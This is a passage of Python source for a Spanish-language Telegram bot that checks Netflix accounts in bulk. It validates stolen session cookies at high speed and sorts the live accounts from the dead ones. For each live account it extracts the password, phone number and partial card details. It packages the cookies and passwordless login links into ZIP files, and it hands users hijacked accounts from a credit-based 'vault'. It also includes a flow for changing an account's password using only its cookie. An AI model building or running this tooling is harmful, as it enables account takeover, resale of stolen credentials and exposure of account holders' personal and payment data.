    lines.append(f"  • Plan: {plan or 'Desconocido'}")
    lines.append(f"  • Precio: {price}")
    lines.append(f"  • Miembro desde: {since}")
    lines.append(f"  • Próxima facturación: {billing}")
    lines.append(f"  • Pago: {payment}")
    if card_line and card_line != payment:
        lines.append(f"  • Card: {card_line}")
    if phone:
        lines.append(f"  • Phone: <code>{phone}</code> (Sí)")
    else:
        lines.append(f"  • Phone: N/A")
    lines.append(f"  • Calidad: {quality}")
    lines.append(f"  • Streams: {streams}")
    lines.append(f"  • Hold Status: {'Sí' if (status == 'on_hold' or is_on_hold) else 'No'}")

    has_extra = num_extra > 0 if isinstance(num_extra, int) else False
    lines.append(f"  • Miembro extra: {'Sí' if has_extra else 'No'}")
    lines.append(f"  • Cupo extra: {str(num_extra) if has_extra else 'N/A'}")
    lines.append(f"  • Email Verified: {_yes_no(email_verified)}")
    lines.append(f"  • Prueba gratuita: {'Sí' if is_free_trial else 'No'}")
    lines.append(f"  • Membership: {ms_status}")

    prof_count = result.get("profile_count") or (
        profiles_count if isinstance(profiles_count, int) else
        (len(profile_names) if profile_names else 0)
    )
    lines.append(f"  • Connected Profiles: {prof_count if prof_count else 'Desconocido'}")
    if profile_names:
        lines.append(f"  • Profile Names: {', '.join(profile_names)}")
        if isinstance(prof_count, int) and prof_count > len(profile_names):
            lines.append(f"    <i>(+{prof_count - len(profile_names)} perfiles más)</i>")

    issues = result.get("account_issues") or []
    if issues:
        lines.append("")
        lines.append("⚠️ <b>Alertas de la cuenta:</b>")
        for issue in issues:
            lines.append(f"  🔴 {issue}")

    lines.append("")
    if nf_id:
        lines.append("🍪 <b>Cookie:</b>")
        lines.append(f"<code>NetflixId={nf_id}</code>")

    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)

def format_error_card(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    status  = normalize_status(result.get("status"), result)
    message = result.get("message") or ""
    nf_id   = result.get("netflix_id") or ""
    counter = f"  #{index}/{total}" if total > 1 else ""

    if status == "invalid":
        header = f"❌ <b>DEAD / INVÁLIDA{counter}</b>"
        reason = message or "La cookie ha caducado o no es válida."
    else:
        header = f"⚠️ <b>ERROR{counter}</b>"
        reason = message or "Error de conexión o timeout."

    lines = [
        header,
        "━━━━━━━━━━━━━━━━━━━━━━",
    ]
    if source:
        lines.append(f"📁 Origen: <code>{source}</code>")
    lines.append(f"• Motivo: <i>{reason}</i>")
    if nf_id:
        snippet = nf_id[:35] + "…" if len(nf_id) > 35 else nf_id
        lines.append(f"🍪 Cookie: <code>{snippet}</code>")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)

def format_result(result: dict, index: int = 1, total: int = 1, source: str = "", user_id: int = 0) -> str:
    try:
        status = normalize_status(result.get("status"), result)
        if status in ("error", "invalid"):
            return format_error_card(result, index, total, source)
        mode = _get_mode(user_id) if user_id else "basic"
        if mode == "basic":
            return format_result_basic(result, index, total, source)
        return format_result_full(result, index, total, source)
    except Exception as e:
        logger.exception("format_result error")
        return f"⚠️ Error visualizando tarjeta #{index} ({e})"


# ---------------------------------------------------------------------------
# Separador de cookies y lector ZIP
# ---------------------------------------------------------------------------

_HIT_BLOCK_COOKIE_RE = re.compile(r'[•\-*]?\s*[Cc]ookies?\s*[:\|]+\s*\S{20,}')
_HIT_SEPARATOR_RE  = re.compile(r'(?m)^[\u2500\u2550\-=─═]{8,}\s*$')

def split_cookies_from_text(text: str) -> list[str]:
    try:
        from checker import universal_extract_accounts
        text = text.strip()
        if not text:
            return []

        if text.startswith("[["):
            try:
                outer = json.loads(text)
                if isinstance(outer, list) and all(isinstance(i, list) for i in outer):
                    return [json.dumps(inner) for inner in outer]
            except Exception:
                pass

        if text.startswith("[") or text.startswith("{"):
            return [text]

        if _HIT_BLOCK_COOKIE_RE.search(text) and _HIT_SEPARATOR_RE.search(text):
            parts = _HIT_SEPARATOR_RE.split(text)
            valid = [p.strip() for p in parts if p.strip() and _HIT_BLOCK_COOKIE_RE.search(p)]
            if valid:
                return valid

        try:
            blocks = universal_extract_accounts(text)
        except Exception:
            blocks = []
        if blocks:
            return blocks

        return [text]
    except Exception:
        return [text] if text.strip() else []

_ZIP_ENTRY_LIMIT = 5000

def read_cookie_texts_from_zip(zip_path: str) -> list[tuple[str, str]]:
    results = []
    read_count = 0
    with zipfile.ZipFile(zip_path, "r") as zf:
        for info in zf.infolist():
            if read_count >= _ZIP_ENTRY_LIMIT:
                break
            name = info.filename
            base = Path(name).name
            if not base or base.startswith("_") or base.startswith("."):
                continue
            ext = Path(name).suffix.lower()
            if ext not in COOKIE_EXTENSIONS:
                continue
            try:
                raw = zf.read(name)
                if _is_binary_content(raw):
                    continue
                text = raw.decode("utf-8", errors="replace").strip()
                if text:
                    results.append((base, text))
                    read_count += 1
            except Exception:
                continue
    return results

def _score_account(result: dict) -> tuple:
    from datetime import datetime, date as _date
    plan = (result.get("plan_name") or "").lower()
    if "premium" in plan:
        plan_score = 5
    elif "standard" in plan and "ads" not in plan:
        plan_score = 4
    elif "standard" in plan:
        plan_score = 3
    elif "basic" in plan or "base" in plan:
        plan_score = 2
    elif "mobile" in plan:
        plan_score = 1
    else:
        plan_score = 0

    no_issues = 0 if result.get("account_issues") else 1
    not_hold  = 0 if result.get("is_on_hold") else 1

    billing_days = 0
    billing_str = result.get("next_billing") or ""
    if billing_str and billing_str not in ("Desconocido", ""):
        try:
            dt = datetime.strptime(billing_str, "%B %d, %Y")
            billing_days = max(0, (dt.date() - _date.today()).days)
        except Exception:
            pass

    member_days = 0
    since_str = result.get("member_since") or ""
    if since_str and since_str not in ("Desconocido", ""):
        try:
            dt = datetime.strptime(since_str, "%B %d, %Y")
            member_days = (_date.today() - dt.date()).days
        except Exception:
            pass

    return (plan_score, no_issues, not_hold, billing_days, member_days)


# ---------------------------------------------------------------------------
# Generador y empaquetador ZIP de hits
# ---------------------------------------------------------------------------

async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> None:
    from checker import generate_nftoken

    loop = asyncio.get_running_loop()
    today = date.today().isoformat()
    exp = "9999999999"

    seen_ids: set[str] = set()
    deduped: list[tuple[dict, str, str]] = []
    for item in hits:
        nf_id = item[0].get("netflix_id") or ""
        if nf_id and nf_id in seen_ids:
            continue
        if nf_id:
            seen_ids.add(nf_id)
        deduped.append(item)

    dupes_removed = len(hits) - len(deduped)

    def _safe_token_worker(result: dict) -> None:
        with _CHECKER_THREAD_LOCK:
            _clean_checker_session()
            try:
                nf_id = result.get("netflix_id")
                if nf_id:
                    result["nftoken"] = generate_nftoken({"NetflixId": nf_id})
            except Exception as _e:
                result["nftoken"] = {"success": False, "error": str(_e)}
            finally:
                _clean_checker_session()

    await asyncio.gather(*[
        loop.run_in_executor(_EXECUTOR, _safe_token_worker, r) for r, _, _ in deduped
    ], return_exceptions=True)

    premium = [(r, s, w) for r, s, w in deduped if "premium" in (r.get("plan_name") or "").lower()]
    normal  = [(r, s, w) for r, s, w in deduped if "premium" not in (r.get("plan_name") or "").lower()]

    def _safe_encode(text: str) -> bytes:
        return str(text).encode("utf-8", errors="replace")

    def _account_file(i: int, total: int, result: dict, source: str) -> str:
        email   = result.get("email")        or f"account_{i}"
        name    = result.get("name")         or ""
        pwd     = result.get("password")     or ""
        phone   = result.get("phone")        or ""
        country = result.get("country")      or "Desconocido"
        plan    = result.get("plan_name")    or "Desconocido"
        quality = result.get("quality")      or "Desconocido"
        streams = result.get("max_streams")  or "?"
        price   = result.get("price")        or "Desconocido"
        since   = result.get("member_since") or "Desconocido"
        billing = result.get("next_billing") or "Desconocido"
        payment = result.get("payment")      or "Desconocido"
        ct      = result.get("card_type")    or ""
        cl4     = result.get("card_last4")   or ""
        cexp    = result.get("card_expiry")  or ""
        profiles= ", ".join(result.get("profile_names") or [])
        ev      = ("Sí" if result.get("email_verified") is True else "No" if result.get("email_verified") is False else "Desconocido")
        ms      = result.get("membership_status") or ""
        nf_id   = result.get("netflix_id")        or ""
        nf_sec  = result.get("secure_netflix_id") or ""
        nf_vid  = result.get("nfvdid")            or ""
        num_ex     = result.get("num_extra_members")  or 0
        status     = normalize_status(result.get("status"), result)
        is_hold    = result.get("is_on_hold", False) or (status == "on_hold")
        free_trial = result.get("is_in_free_trial",  False)
        prof_count = result.get("profile_count")     or len(result.get("profile_names") or []) or 0
        flag       = _flag(country)
        nft        = result.get("nftoken")           or {}
        issues     = result.get("account_issues")    or []

        W = 66
        sep  = "═" * W
        thin = "─" * W

        def box_line(label: str, value: str) -> str:
            return f"  {label:<20} {value}"

        lines = [
            sep,
            f"  RESULTADO NETFLIX  #{i}/{total}   —   {plan.upper()}",
            sep,
            "",
            f"  {'DETALLES DE LA CUENTA':^{W-2}}",
            thin,
        ]
        lines.append(box_line("Email:", email))
        if pwd:
            lines.append(box_line("Contraseña:", pwd))
        if name:
            lines.append(box_line("Name:", name))
        if phone:
            lines.append(box_line("Phone:", phone))
        lines.append(box_line("País:", f"{country} {flag}".strip()))
        lines.append(box_line("Status:", "En espera ⏸" if status == "on_hold" else "Active ✅"))
        lines += ["", f"  {'SUBSCRIPTION':^{W-2}}", thin]
        lines.append(box_line("Plan:", plan))
        lines.append(box_line("Calidad:", f"{quality}  ·  {streams} screen(s)"))
        lines.append(box_line("Precio:", price))
        lines.append(box_line("Miembro desde:", since))
        lines.append(box_line("Próxima facturación:", billing))
        lines.append(box_line("Pago:", payment))
        if ct:
            card_str = ct
            if cl4:
                card_str += f" ···· {cl4}"
            if cexp:
                card_str += f"  (exp {cexp})"
            lines.append(box_line("Card:", card_str))
        lines.append(box_line("Hold Status:", "Sí ⏸" if is_hold else "No"))
        lines.append(box_line("Prueba gratuita:", "Sí" if free_trial else "No"))
        lines.append(box_line("Miembro extra:", f"Sí — {num_ex} slot(s)" if num_ex > 0 else "No"))
        lines.append(box_line("Email Verified:", ev))
        lines.append(box_line("Membership:", ms))
        lines.append(box_line("Profiles:", str(prof_count) if prof_count else "Desconocido"))
        if profiles:
            lines.append(box_line("Profile Names:", profiles))
        lines.append(box_line("Origen:", source))
        if issues:
            lines += ["", f"  {'ACCOUNT ALERTS':^{W-2}}", thin]
            for iss in issues:
                lines.append(f"  ⚠  {iss}")

        lines += ["", f"  {'ENLACES DE INICIO DE SESIÓN':^{W-2}}", thin]
        if nft.get("success"):
            token_val = nf_id
            pc_lnk = nft.get("pc_url") or f"https://www.netflix.com/browse?nftoken={token_val}"
            mob_lnk = f"https://www.netflix.com/browse?nftoken={token_val}"
            tv_lnk = f"https://www.netflix.com/YourAccount?nftoken={token_val}"
            lines.append(box_line("💻 PC:", pc_lnk))
            lines.append(box_line("📱 Móvil:", mob_lnk))
            lines.append(box_line("📺 TV:", tv_lnk))
            if nft.get("expires"):
                lines.append(box_line("Expires:", nft["expires"]))
        else:
            lines.append(box_line("Status:", "No disponible"))

        lines += ["", f"  {'COOKIES  (Netscape HTTP Cookie File)':^{W-2}}", thin]
        if nf_id:
            lines.append(f"  .netflix.com\tTRUE\t/\tTRUE\t{exp}\tNetflixId\t{nf_id}")
        if nf_sec:
            lines.append(f"  .netflix.com\tTRUE\t/\tTRUE\t{exp}\tSecureNetflixId\t{nf_sec}")
        if nf_vid:
            lines.append(f"  .netflix.com\tTRUE\t/\tFALSE\t{exp}\tnfvdid\t{nf_vid}")

        wm = f"@{_BOT_USERNAME}" if _BOT_USERNAME else "Bill Cypher Netflix Checker"
        lines += ["", thin, f"  {'Comprobado por ' + wm:^{W-2}}", sep, ""]
        return "\n".join(lines)

    buf = io.BytesIO()
    total_hits = len(deduped)

    try:
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            on_hold_count = sum(1 for r, _, _ in deduped if normalize_status(r.get("status"), r) == "on_hold")
            W = 52
            summary_lines = [
                "╔" + "═" * W + "╗",
                f"║{'  RESULTADOS NETFLIX  —  ' + today:^{W}}║",
                "╠" + "═" * W + "╣",
                f"║{'':^{W}}║",
                f"║  Total Resultados     :  {total_hits:<{W-20}}║",
                f"║  Premium Resultados   :  {len(premium):<{W-20}}║",
                f"║  Normal Resultados    :  {len(normal):<{W-20}}║",
                f"║  En espera (incl.):  {on_hold_count:<{W-20}}║",
                f"║{'':^{W}}║",
            ]
            if dupes_removed > 0:
                summary_lines.append(f"║  Duplicados filtrados :  {dupes_removed:<{W-20}}║")
            summary_lines += [
                "╚" + "═" * W + "╝",
                "",
                "Cada archivo de cuenta contiene:",
                "  • Detalles completos de la cuenta",
                "  • Cookie (formato Netscape)",
                "  • Enlaces directos PC / Móvil / TV",
            ]
            zf.writestr("_SUMMARY.txt", _safe_encode("\n".join(summary_lines)))

            for i, (result, src, _) in enumerate(premium, 1):
                email   = result.get("email") or f"account_{i}"
                safe    = re.sub(r'[^\w@._-]', '_', str(email))[:35]
                plan    = re.sub(r'[^\w ]', '', str(result.get("plan_name") or "Premium"))[:20].strip()
                c_flag  = _flag(result.get("country") or "")
                flag_pre = f"{c_flag}_" if c_flag else ""
                fname   = f"Premium Resultados/{i:02d}_{flag_pre}{safe}_{plan}.txt"
                content_bytes = _safe_encode(_account_file(i, len(premium), result, src))
                zf.writestr(fname, content_bytes)

            for i, (result, src, _) in enumerate(normal, 1):
                email   = result.get("email") or f"account_{i}"
                safe    = re.sub(r'[^\w@._-]', '_', str(email))[:35]
                plan    = re.sub(r'[^\w ]', '', str(result.get("plan_name") or "Hit"))[:20].strip()
                c_flag  = _flag(result.get("country") or "")
                flag_pre = f"{c_flag}_" if c_flag else ""
                fname   = f"Normal Resultados/{i:02d}_{flag_pre}{safe}_{plan}.txt"
                content_bytes = _safe_encode(_account_file(i, len(normal), result, src))
                zf.writestr(fname, content_bytes)

    except Exception as _zip_err:
        logger.exception("send_hits_zip falló")
        raise RuntimeError(f"Fallo al empaquetar ZIP: {_zip_err}") from _zip_err

    buf.seek(0)
    rand2    = random.randint(10, 99)
    zip_name = f"Netflix-Resultados-{total_hits}x-{rand2}.zip"

    caption_parts = [
        f"📦 <b>Netflix-Resultados-{total_hits}x-{rand2}.zip</b>",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"  🌟 Premium Resultados  »  <b>{len(premium)}</b>",
        f"  ✅ Normal Resultados   »  <b>{len(normal)}</b>",
        f"  📊 Total               »  <b>{total_hits}</b>",
    ]
    if dupes_removed > 0:
        caption_parts.append(f"  ♻️ Duplicados eliminados »  <b>{dupes_removed}</b>")
    caption_parts += [
        "━━━━━━━━━━━━━━━━━━━━━━",
        "📁 <code>Premium Resultados/</code>  — Cuentas Premium 4K",
        "📁 <code>Normal Resultados/</code>   — Estándar / Básicas",
        "📄 <code>_SUMMARY.txt</code>   — Resumen general",
    ]

    await update.message.reply_document(
        document=buf,
        filename=zip_name,
        caption="\n".join(caption_parts),
        parse_mode=ParseMode.HTML,
    )


# ---------------------------------------------------------------------------
# Procesamiento central 5G de verificación masiva
# ---------------------------------------------------------------------------

async def process_cookies(update: Update, status_msg, cookie_text: str, source: str = "") -> None:
    sets = split_cookies_from_text(cookie_text)
    if not sets:
        await status_msg.edit_text("⚠️ No se encontraron cookies.")
        return

    if len(sets) == 1:
        await status_msg.edit_text(
            "⚡ <b>" + to_bold_italic("BILL CYPHER | CHECKING") + "</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🍪 <b>Cuenta:</b> 1 detectada\n"
            "🔄 <b>Estado:</b> <i>Conectando a Netflix API...</i>\n"
            "━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
        )
    else:
        await status_msg.edit_text(
            "⚡ <b>" + to_bold_italic("BILL CYPHER | CHECKING 5G") + "</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Lote detectado:</b> {len(sets)} cuentas\n"
            "🔄 <b>Estado:</b> <i>Iniciando verificación masiva 5G...</i>\n"
            "━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
        )

    tuples = [(source or f"cuenta_{i}", s, s) for i, s in enumerate(sets, 1)]
    await process_cookie_sets(update, status_msg, tuples)

async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tuple[str, str, str]]) -> None:
    loop = asyncio.get_running_loop()
    total = len(cookie_sets)
    is_bulk = total > 1

    if total == 0:
        await status_msg.edit_text("⚠️ No se encontraron datos.")
        return

    uid = update.effective_user.id if update.effective_user else 0
    hits_list: list[tuple[dict, str, str]] = []
    hits = frees = invalids = errors = on_hold = 0
    t_start = time.monotonic()
    last_edit_time = 0.0
    session_id = status_msg.message_id
    if uid:
        _USER_SESSION[uid] = session_id

    for batch_start in range(0, total, BULK_CONCURRENCY):
        if session_id in _CANCEL_SESSIONS:
            _CANCEL_SESSIONS.discard(session_id)
            await status_msg.edit_text("🛑 <b>Verificación cancelada.</b>", parse_mode=ParseMode.HTML)
            if hits_list:
                await send_hits_zip(update, hits_list)
            return

        batch = cookie_sets[batch_start: batch_start + BULK_CONCURRENCY]

        batch_results = await asyncio.gather(*[
            loop.run_in_executor(
                _EXECUTOR,
                functools.partial(safe_check_cookie_isolated, generate_token=not is_bulk, bulk_mode=is_bulk),
                cs,
            )
            for _src, cs, _raw in batch
        ], return_exceptions=True)

        for (src, cs, raw), result in zip(batch, batch_results):
            if isinstance(result, Exception):
                result = {"status": "error", "message": str(result)}

            status = normalize_status(result.get("status"), result)
            idx = batch_start + batch.index((src, cs, raw)) + 1

            if status == "hit":
                hits += 1
                hits_list.append((result, src, raw))
            elif status == "free":
                frees += 1
            elif status == "on_hold":
                on_hold += 1
                hits_list.append((result, src, raw))
            else:
                invalids += 1

            user_id = update.effective_user.id if update.effective_user else 0
            stats_tracker.record_check(status, user_id=user_id, source=src)
            if status in ("hit", "free", "on_hold"):
                mongodb_store.save_hit(result, user_id=user_id, source=src)
            result["_source"] = src

            if not is_bulk:
                txt = format_result(result, idx, total, source=src, user_id=uid)
                core_tok = extract_core_netflix_id(cs)
                kb = build_official_login_keyboard(result, core_tok)
                try:
                    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
                except Exception:
                    pass

        # Throttle de edición a 3.5 segundos para evitar límites de tasa
        if is_bulk:
            now_time = time.monotonic()
            done_so_far = min(batch_start + len(batch), total)
            if (now_time - last_edit_time >= 3.5) or (done_so_far == total):
                last_edit_time = now_time
                elapsed = now_time - t_start
                speed = done_so_far / elapsed * 60 if elapsed > 1 and done_so_far > 0 else 0
                try:
                    await status_msg.edit_text(
                        "⚡ <b>" + to_bold_italic("BILL CYPHER | VERIFICANDO 5G") + "</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📊 <b>Progreso:</b> {make_progress_bar(done_so_far, total)} {done_so_far}/{total}\n"
                        f"🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n\n"
                        f"● <b>Hits (Live):</b> {hits}  ·  <b>Muertas (Dead):</b> {invalids}\n"
                        f"● <b>En espera:</b> {on_hold}  ·  <b>Free:</b> {frees}\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "⏳ <i>Procesando cuentas a máxima velocidad 5G...</i>",
                        parse_mode=ParseMode.HTML,
                        reply_markup=_cancel_keyboard(session_id),
                    )
                except Exception:
                    pass

    elapsed = time.monotonic() - t_start
    speed   = total / elapsed * 60 if elapsed > 0 else 0
    mins, secs = divmod(int(elapsed), 60)
    time_str = f"{mins}m {secs}s" if mins else f"{secs}s"

    _CANCEL_SESSIONS.discard(session_id)
    _USER_SESSION.pop(uid, None)

    if is_bulk and hits_list:
        _seen_keys: set[str] = set()
        _deduped: list[tuple[dict, str, str]] = []
        for _item in hits_list:
            _nf_id = _item[0].get("netflix_id") or ""
            if _nf_id and _nf_id in _seen_keys:
                continue
            if _nf_id:
                _seen_keys.add(_nf_id)
            _deduped.append(_item)
        hits_list = _deduped
        hits    = sum(1 for r, _, _ in _deduped if normalize_status(r.get("status"), r) == "hit")
        on_hold = sum(1 for r, _, _ in _deduped if normalize_status(r.get("status"), r) == "on_hold")

    if is_bulk:
        premium_count = sum(1 for r, _, _ in hits_list if "premium" in (r.get("plan_name") or "").lower())
        try:
            await status_msg.edit_text(
                "⚡ <b>" + to_bold_italic("BILL CYPHER | COMPLETADO 5G") + "</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <i>Verificación masiva completada con éxito</i>\n"
                f"⏱️ <b>Tiempo:</b> {time_str}  ·  🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n"
                "━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML,
                reply_markup=None,
            )
        except Exception:
            pass

        await update.message.reply_text(
            f"📊 <b>Resumen Masivo — Resultados</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  ✅ Hits (Live / Activos) » <b>{hits}</b> (🌟 Premium: {premium_count})\n"
            f"  ❌ Muertas (Dead / Inválidas) » <b>{invalids}</b>\n"
            f"  ⏸️ En espera (On Hold)   » <b>{on_hold}</b>\n"
            f"  🔓 Free (Sin plan)       » <b>{frees}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  📦 Total comprobado      » <b>{total}</b>\n"
            f"  ⏱️ Tiempo total          » <b>{time_str}</b>\n"
            f"  🚀 Velocidad media       » <b>{speed:.1f} acc/min</b>",
            parse_mode=ParseMode.HTML,
        )

        if hits_list:
            delivery = _get_delivery(uid)
            if delivery == "cards":
                for card_i, (c_result, c_src, c_raw) in enumerate(hits_list, 1):
                    try:
                        c_txt = format_result(c_result, card_i, len(hits_list), source=c_src, user_id=uid)
                        core_t = extract_core_netflix_id(c_raw)
                        c_kb = build_official_login_keyboard(c_result, core_t)
                        await update.message.reply_text(c_txt, parse_mode=ParseMode.HTML, reply_markup=c_kb)
                        await asyncio.sleep(0.3)
                    except Exception:
                        pass
            else:
                try:
                    await send_hits_zip(update, hits_list)
                except Exception as _ze:
                    await update.message.reply_text(f"⚠️ Error al crear el ZIP: {_ze}", parse_mode=ParseMode.HTML)

                try:
                    sorted_hits = sorted(hits_list, key=lambda x: _score_account(x[0]), reverse=True)
                    best_result, best_src, best_raw = sorted_hits[0]
                    best_txt = format_result(best_result, 1, 1, source=best_src, user_id=uid)
                    best_tok = extract_core_netflix_id(best_raw)
                    best_kb = build_official_login_keyboard(best_result, best_tok)
                    full_best = (
                        "🏆 <b>Mejor Cuenta del Lote</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n" + best_txt
                    )
                    await update.message.reply_text(full_best, parse_mode=ParseMode.HTML, reply_markup=best_kb)
                except Exception:
                    pass
        else:
            await update.message.reply_text("📭 No se encontraron hits válidos en este lote.")

    try:
        await status_msg.delete()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Handlers de comandos e interactividad del panel
# ---------------------------------------------------------------------------

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        stats_tracker.record_user(uid)
        _record_user_id(uid)
    text = _main_panel_text(uid)
    markup = _main_panel_markup(uid)
    await _send_banner_panel(update, text, markup)

async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    uid = query.from_user.id if query.from_user else 0
    data = query.data

    if data == "panel:back":
        await query.answer()
        await _edit_panel_message(query, _main_panel_text(uid), _main_panel_markup(uid))

    elif data == "panel:settings":
        await query.answer()
        await _edit_panel_message(query, _settings_text(uid), _settings_markup(uid))

    elif data == "panel:info":
        await query.answer()
        await _edit_panel_message(query, _info_text(uid), _panel_back_markup())

    elif data == "panel:help":
        await query.answer()
        await _edit_panel_message(query, _help_text(), _panel_back_markup())

    elif data == "panel:changepw":
        await query.answer()
        _CHANGEPW_STATE[uid] = {"step": "netflix_id"}
        await query.message.reply_text(
            "🔐 <b>Cambiar Contraseña</b> <i>[BETA]</i>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Paso 1 de 3 — Introduce el valor de la cookie <b>NetflixId</b> de la cuenta:\n"
            "<i>(la cadena NetflixId que empieza por ct%3D)</i>\n\n"
            "Envía /cancel en cualquier momento para abortar.",
            parse_mode=ParseMode.HTML,
        )

    elif data == "panel:proxy":
        if not is_admin(uid):
            await query.answer("⛔ Solo el propietario.", show_alert=True)
            return
        await query.answer()
        from proxy_manager import proxy_manager as pm
        await _edit_panel_message(query, _proxy_panel_text(), _proxy_panel_markup(pm))

    elif data == "panel:users":
        if not is_admin(uid):
            await query.answer("⛔ Solo el propietario.", show_alert=True)
            return
        await query.answer()
        if not _USERS_FILE.exists():
            await query.message.reply_text("⚠️ No hay usuarios registrados todavía.")
            return
        uids = [u.strip() for u in _USERS_FILE.read_text(encoding="utf-8").splitlines() if u.strip().isdigit()]
        total = len(uids)
        await query.message.reply_text(
            "👥 <b>Base de Datos de Usuarios</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• <b>Total registrados:</b> <code>{total}</code> usuarios únicos\n"
            "━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
        )
        with open(_USERS_FILE, "rb") as f:
            await query.message.reply_document(
                document=f,
                filename="users.txt",
                caption=f"📄 Lista con los {total} IDs registrados",
            )

    elif data == "panel:vault":
        if not is_admin(uid):
            await query.answer("⛔ Solo el propietario.", show_alert=True)
            return
        await query.answer()
        vault = _load_vault()
        await query.message.reply_text(
            "📦 <b>Gestión del Baúl de Cookies</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• <b>Stock disponible (único):</b> <code>{len(vault)}</code> cuentas listas\n\n"
            "💡 <b>Para agregar cuentas:</b>\n"
            "Envía el archivo <code>.zip</code> generado por el checker con pie de foto <code>/addvault</code>.\n\n"
            "💡 <b>Para vaciar stock:</b>\n"
            "Escribe <code>/clearvault</code>",
            parse_mode=ParseMode.HTML,
        )

    elif data == "panel:gencookie":
        if not consume_credit(uid):
            await query.answer("❌ Sin créditos disponibles.", show_alert=True)
            await query.message.reply_text(
                OUT_OF_CREDITS_TEXT,
                parse_mode=ParseMode.HTML,
                reply_markup=out_of_credits_markup()
            )
            return

        vault = _load_vault()
        if not vault:
            refund_credit(uid)
            await query.answer("❌ Cookies agotadas", show_alert=True)
            await query.message.reply_text(
                "📭 <b>¡Se agotaron las cookies!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Espera a que el propietario cargue nuevas cookies al baúl.\n"
                "━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML
            )
            return

        await query.answer("⚡ Extrayendo cuenta...")
        loop = asyncio.get_running_loop()

        chosen_cookie = None
        chosen_res = None

        # Bloqueo atómico: garantiza extracción única y chequeo en tiempo real
        async with _ASYNC_VAULT_LOCK:
            vault = _load_vault()
            if not vault:
                refund_credit(uid)
                await query.message.reply_text("📭 <b>¡Se agotaron las cookies en el baúl!</b>", parse_mode=ParseMode.HTML)
                return

            attempts = 0
            max_attempts = min(len(vault), 25)

            while attempts < max_attempts and vault:
                rand_idx = random.randrange(len(vault))
                candidate = vault.pop(rand_idx)
                attempts += 1

                # Chequeo aislado sin cruce de cookies
                candidate_res = await loop.run_in_executor(
                    _EXECUTOR, functools.partial(safe_check_cookie_isolated, generate_token=True), candidate
                )

                status = normalize_status(candidate_res.get("status"), candidate_res)
                if status == "hit":
                    chosen_cookie = candidate
                    chosen_res = candidate_res
                    break

            if chosen_res:
                delivered_token = extract_core_netflix_id(chosen_cookie)
                delivered_email = (chosen_res.get("email") or "").strip().lower()

                # Purga inmediata de duplicados en el baúl
                clean_vault = []
                for c in vault:
                    c_token = extract_core_netflix_id(c)
                    if delivered_token and c_token == delivered_token:
                        continue
                    if delivered_email and delivered_email != "netflix account" and delivered_email in c.lower():
                        continue
                    clean_vault.append(c)

                _save_vault(clean_vault)

        if not chosen_cookie or not chosen_res:
            refund_credit(uid)
            _save_vault(vault)
            await query.message.reply_text(
                "⚠️ <b>No se encontraron cuentas activas en este momento.</b>\n"
                "<i>Tu crédito fue reembolsado automáticamente. Intenta de nuevo.</i>",
                parse_mode=ParseMode.HTML
            )
            return

        plan = chosen_res.get("plan_name") or "Premium"
        country = chosen_res.get("country") or "Desconocido"
        email = chosen_res.get("email") or "Netflix Account"

        core_token = extract_core_netflix_id(chosen_cookie) or chosen_res.get("netflix_id") or ""
        clean_cookie = f"NetflixId={core_token}" if core_token else chosen_cookie.strip()

        txt = (
            "🎉 <b>" + to_bold_italic("TU CUENTA DE NETFLIX ESTA LISTA!") + "</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"● 🎬 <b>" + to_bold_italic("Plan:") + f"</b> {plan}\n"
            f"● 🌍 <b>" + to_bold_italic("Pais:") + f"</b> {_country_display(country)}\n"
            f"● 📧 <b>" + to_bold_italic("Email:") + f"</b> <code>{email}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🍪 <b>" + to_bold_italic("Cookie (Toca para copiar):") + f"</b>\n<code>{clean_cookie}</code>\n\n"
            "<i>Presiona un botón para entrar directo sin contraseña o generar otra:</i>\n"
            "<i>💡 Si tu navegador ya tenía una sesión abierta, usa pestaña incógnito para ver este perfil directo.</i>"
        )
        kb = build_official_login_keyboard(chosen_res, core_token)
        await query.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)

async def cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer("Cancelando…")
    try:
        msg_id = int(query.data.split(":")[1])
        _CANCEL_SESSIONS.add(msg_id)
    except Exception:
        pass

async def mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    try:
        user_id = int(query.data.split(":")[1])
